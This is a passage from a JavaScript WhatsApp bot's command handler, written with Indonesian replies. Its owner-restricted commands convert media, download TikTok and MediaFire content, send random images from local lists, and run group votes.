let media = await Biiofc.downloadAndSaveMediaMessage(quoted)
let webpToMp4 = await webp2mp4File(media)
await Biiofc.sendMessage(from, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' }, gifPlayback: true }, {quoted:m})
await fs.unlinkSync(media)
}
break
case 'toimg': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
	const getRandom = (ext) => {
            return `${Math.floor(Math.random() * 10000)}${ext}`
        }
        if (!m.quoted) return reply(`_Reply to Any Sticker._`)
        let mime = m.quoted.mtype
if (mime =="imageMessage" || mime =="stickerMessage")
{
        let media = await Biiofc.downloadAndSaveMediaMessage(m.quoted)
        let name = await getRandom('.png')
        exec(`ffmpeg -i ${media} ${name}`, (err) => {
        	fs.unlinkSync(media)
            let buffer = fs.readFileSync(name)
            Biiofc.sendMessage(m.chat, { image: buffer }, { quoted: m })      
fs.unlinkSync(name)
        })
        
} else return reply(`Please reply to non animated sticker`)
    }
    break
case 'tomp4': case 'tovideo': {
                if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
                if (!quoted) return reply('Reply to Sticker')
                if (!/webp/.test(mime)) return reply(`reply sticker with caption *${prefix + command}*`)
		        let { webp2mp4File } = require('./freya/uploader')
                let media = await Biiofc.downloadAndSaveMediaMessage(quoted)
                let webpToMp4 = await webp2mp4File(media)
                await Biiofc.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' } }, { quoted: m })
                await fs.unlinkSync(media)
            }
            break
case 'tourl': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
if (!/video/.test(mime) && !/image/.test(mime)) throw `*Send/Reply the Video/Image With Caption* ${prefix + command}`
if (!quoted) throw `*Send/Reply the Video/Image Caption* ${prefix + command}`
let { UploadFileUgu, webp2mp4File, TelegraPh } = require('./freya/uploader')
let media = await Biiofc.downloadAndSaveMediaMessage(quoted)
if (/image/.test(mime)) {
let anu = await TelegraPh(media)
m.reply(util.format(anu))
} else if (!/image/.test(mime)) {
let anu = await UploadFileUgu(media)
reply(util.format(anu))
}
await fs.unlinkSync(media)
}
break
case 'getbio':{
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
              try {
    let who
    if (m.isGroup) who = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted.sender
    else who = m.quoted.sender ? m.quoted.sender : m.sender
    let bio = await Biiofc.fetchStatus(who)
    reply(bio.status)
  } catch {
    if (text) return reply(`bio is private or you haven't replied to the person's message!`)
    else try {
      let who = m.quoted ? m.quoted.sender : m.sender
      let bio = await Biiofc.fetchStatus(who)
      reply(bio.status)
    } catch {
      return reply(`bio is private or you haven't replied to the person's message!`)
    }
  }
}
break

case 'tiktokaudio':{
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
if (!text) return reply( `Example : ${prefix + command} link`)
if (!q.includes('tiktok')) return reply(`Link Invalid!!`)
require('./freya/tiktok').Tiktok(q).then( data => {
Biiofc.sendMessage(m.chat, { audio: { url: data.audio }, mimetype: 'audio/mp4' }, { quoted: m })
})
}
break
case 'r': case 'revoke': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
if (!isBotAdmins) return reply(mess.only.badmin)
Biiofc.groupRevokeInvite(m.chat)
}
break
case 'tiktokgirl':
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
XeonStickWait()
var asupan = JSON.parse(fs.readFileSync('./HostMedia/tiktokvids/tiktokgirl.json'))
var hasil = pickRandom(asupan)
Biiofc.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktokghea':
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
XeonStickWait()
var gheayubi = JSON.parse(fs.readFileSync('./HostMedia/tiktokvids/gheayubi.json'))
var hasil = pickRandom(gheayubi)
Biiofc.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktokbocil':
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
XeonStickWait()
var bocil = JSON.parse(fs.readFileSync('./HostMedia/tiktokvids/bocil.json'))
var hasil = pickRandom(bocil)
Biiofc.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktoknukhty':
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
XeonStickWait()
var ukhty = JSON.parse(fs.readFileSync('./HostMedia/tiktokvids/ukhty.json'))
var hasil = pickRandom(ukhty)
Biiofc.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktoksantuy':
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
XeonStickWait()
var santuy = JSON.parse(fs.readFileSync('./HostMedia/tiktokvids/santuy.json'))
var hasil = pickRandom(santuy)
Biiofc.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktokkayes':
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
XeonStickWait()
var kayes = JSON.parse(fs.readFileSync('./HostMedia/tiktokvids/kayes.json'))
var hasil = pickRandom(kayes)
Biiofc.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktokpanrika':
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
XeonStickWait()
var rikagusriani = JSON.parse(fs.readFileSync('./HostMedia/tiktokvids/panrika.json'))
var hasil = pickRandom(rikagusriani)
Biiofc.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktoknotnot':
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
XeonStickWait()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/tiktokvids/notnot.json'))
var hasil = pickRandom(notnot)
Biiofc.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'chinese':
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
XeonStickWait()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/tiktokpics/china.json'))
var hasil = pickRandom(notnot)
Biiofc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'hijab':
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
XeonStickWait()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/tiktokpics/hijab.json'))
var hasil = pickRandom(notnot)
Biiofc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'indo':
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
XeonStickWait()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/tiktokpics/indonesia.json'))
var hasil = pickRandom(notnot)
Biiofc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'japanese':
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
XeonStickWait()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/tiktokpics/japan.json'))
var hasil = pickRandom(notnot)
Biiofc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'korean':
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
XeonStickWait()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/tiktokpics/korea.json'))
var hasil = pickRandom(notnot)
Biiofc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'malay':
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
XeonStickWait()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/tiktokpics/malaysia.json'))
var hasil = pickRandom(notnot)
Biiofc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'randomgirl':
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
XeonStickWait()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/tiktokpics/random.json'))
var hasil = pickRandom(notnot)
Biiofc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'randomboy':
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
XeonStickWait()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/tiktokpics/random2.json'))
var hasil = pickRandom(notnot)
Biiofc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'thai':
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
XeonStickWait()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/tiktokpics/thailand.json'))
var hasil = pickRandom(notnot)
Biiofc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'vietnamese':
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
XeonStickWait()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/tiktokpics/vietnam.json'))
var hasil = pickRandom(notnot)
Biiofc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'aesthetic':
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
XeonStickWait()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/aesthetic.json'))
var hasil = pickRandom(notnot)
Biiofc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'antiwork':
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
XeonStickWait()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/antiwork.json'))
var hasil = pickRandom(notnot)
Biiofc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'blackpink':
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
XeonStickWait()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/blackpink.json'))
var hasil = pickRandom(notnot)
Biiofc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'bike':
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
XeonStickWait()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/bike.json'))
var hasil = pickRandom(notnot)
Biiofc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'boneka':
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
XeonStickWait()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/boneka.json'))
var hasil = pickRandom(notnot)
Biiofc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'cosplay':
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
XeonStickWait()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/cosplay.json'))
var hasil = pickRandom(notnot)
Biiofc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'cat':
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
XeonStickWait()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/cat.json'))
var hasil = pickRandom(notnot)
Biiofc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'doggo':
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
XeonStickWait()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/doggo.json'))
var hasil = pickRandom(notnot)
Biiofc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'justina':
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
XeonStickWait()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/justina.json'))
var hasil = pickRandom(notnot)
Biiofc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'kayes':
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
XeonStickWait()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/kayes.json'))
var hasil = pickRandom(notnot)
Biiofc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'kpop':
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
XeonStickWait()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/kpop.json'))
var hasil = pickRandom(notnot)
Biiofc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'notnot':
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
XeonStickWait()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/notnot.json'))
var hasil = pickRandom(notnot)
Biiofc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
        case 'vote': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
  if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.');
            if (!isGroup) return reply(mess.only.group)
            if (m.chat in vote) return reply(`_There are still votes in this chat!_\n\n*${prefix}deletevote* - to delete votes`)
            if (!text) return reply(`Enter Reason for Vote, Example: *${prefix + command} Handsome Owner*`)
            reply(`Voting starts!\n\n*${prefix}upvote* - for upvote\n*${prefix}downvote* - for downvote\n*${prefix}checkvote* - to check the vote\n*${prefix}deletevote* - to delete vote`)
            vote[m.chat] = [q, [], []]
            await sleep(1000)
            upvote = vote[m.chat][1]
            devote = vote[m.chat][2]
            teks_vote = `* VOTE *

*Reason:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
│
│ 
└────

┌〔 DOWNVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
│
│ 
└────

Please Type Below
*${prefix}upvote* - to cast vote
*${prefix}downvote* -  to downvote
*${prefix}deletevote* - to delete vote`
            Biiofc.sendMessage(m.chat, {text: teks_vote}, {quoted:fkontak})
	    }
            break
               case 'upvote': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
  if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.');
            if (!isGroup) return reply(mess.only.group)
            if (!(m.chat in vote)) return reply(`_*no voting in this group!*_\n\n*${prefix}vote* - to start voting`)
            isVote = vote[m.chat][1].concat(vote[m.chat][2])
            wasVote = isVote.includes(m.sender)
            if (wasVote) return reply('You have Voted')
            vote[m.chat][1].push(m.sender)
            menvote = vote[m.chat][1].concat(vote[m.chat][2])
            teks_vote = `* VOTE *

*Reason:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

┌〔 DOWNVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

Please Type Below
*${prefix}upvote* - to upvote
*${prefix}downvote* -  to downvote
*${prefix}deletevote* - to delete vote`
            Biiofc.sendMessage(m.chat, {text: teks_vote, mentions: menvote}, {quoted:fkontak})
	    }
             break
                case 'downvote': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
  if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.');
            if (!isGroup) return reply(mess.only.group)
            if (!(m.chat in vote)) return replygcxeon(`_*no voting in this group!*_\n\n*${prefix}vote* - to start voting`)
            isVote = vote[m.chat][1].concat(vote[m.chat][2])
            wasVote = isVote.includes(m.sender)
            if (wasVote) return reply('You have Voted')
            vote[m.chat][2].push(m.sender)
            menvote = vote[m.chat][1].concat(vote[m.chat][2])
            teks_vote = `* VOTE *

*Reason:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

┌〔 DOWNVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

Please Type Below
*${prefix}upvote* - to upvote
*${prefix}downvote* -  to downvote
*${prefix}deletevote* - to delete vote`
            Biiofc.sendMessage(m.chat, {text: teks_vote, mentions: menvote}, {quoted:fkontak})
	}
            break
case 'checkvote':
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
  if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.');
if (!isGroup) return reply(mess.only.group)
if (!(m.chat in vote)) return reply(`_*no voting in this group!*_\n\n*${prefix}vote* - to start voting`)
teks_vote = `* VOTE *

*Reason:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${upvote.length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

┌〔 DOWNVOTE 〕
│ 
├ Total: ${devote.length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

*${prefix}deletevote* - to delete votes


©${Biiofc.user.id}
`
Biiofc.sendTextWithMentions(m.chat, teks_vote, m)
break
case 'deletevote': case'delvote': case 'hapusvote': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
  if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.');
            if (!isGroup) return reply(mess.only.group)
            if (!(m.chat in vote)) return reply(`_*no voting in this group!*_\n\n*${prefix}vote* - to start voting`)
            delete vote[m.chat]
            reply('Successfully Deleted Vote Session In This Group')
	    }
            break
case 'ss': case 'ssweb': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
if (!q) return reply(`Example ${prefix+command} link`)
XeonStickWait()
let krt = await scp1.ssweb(q)
Biiofc.sendMessage(from,{image:krt.result,caption:mess.succes}, {quoted:fkontak})
}
break
case 'tiktok':{ 
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
if (!text) return reply( `Example : ${prefix + command} link`)
if (!q.includes('tiktok')) return reply(`Link Invalid!!`)
require('./freya/tiktok').Tiktok(q).then( data => {
Biiofc.sendMessage(m.chat, { caption: `Sukses, Ini Tuan Video Nya`, video: { url: data.watermark }}, {quoted:m})
})
}
break
case 'mediafire': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
	if (args.length == 0) return reply(`Link Nya Tuan?`)
	if (!isUrl(args[0]) && !args[0].includes('mediafire.com')) return reply(`The link you provided is invalid`)
	const { mediafireDl } = require('./freya/mediafire.js')
	const baby1 = await mediafireDl(text)
	if (baby1[0].size.split('MB')[0] >= 100) return reply('Oops, the file is too big...')
	const result4 = `*MEDIAFIRE DOWNLOADER*

*❖ Name* : ${baby1[0].nama}
*❖ Size* : ${baby1[0].size}
*❖ Mime* : ${baby1[0].mime}
*❖ Link* : ${baby1[0].link}`
reply(`${result4}`)
Biiofc.sendMessage(m.chat, { document : { url : baby1[0].link}, fileName : baby1[0].nama, mimetype: baby1[0].mime }, { quoted : m })
}
break
case 'listblock': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
	const lisben = "Total Ban: " + banUser.length
	reply(lisben)
	}
	break
case 'delete': case 'del': {
                if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
                if (!m.quoted) return false
                let { chat, fromMe, id, isBaileys } = m.quoted
                if (!isBaileys) return reply('Pesan tersebut bukan dikirim oleh bot!')
                Biiofc.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: true, id: m.quoted.id, participant: m.quoted.sender } })
            }
            break
case 'closetime': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
